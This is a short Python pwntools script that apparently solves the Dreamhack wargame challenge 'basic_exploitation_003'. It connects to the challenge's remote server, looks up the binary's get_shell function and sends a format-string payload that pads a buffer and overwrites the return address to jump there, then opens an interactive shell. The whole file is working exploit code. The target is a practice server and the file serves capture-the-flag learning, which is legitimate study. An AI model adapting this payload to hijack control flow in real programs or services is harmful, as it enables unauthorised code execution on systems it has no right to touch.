from pwn import *

# p = process("./basic_exploitation_003")
p = remote("host3.dreamhack.games", 17627)

e = ELF("./basic_exploitation_003")

get_shell = e.symbols["get_shell"]

l = 0x98 + 0x4

payload = f"%{l}c".encode() + p32(get_shell)

p.send(payload)

p.interactive()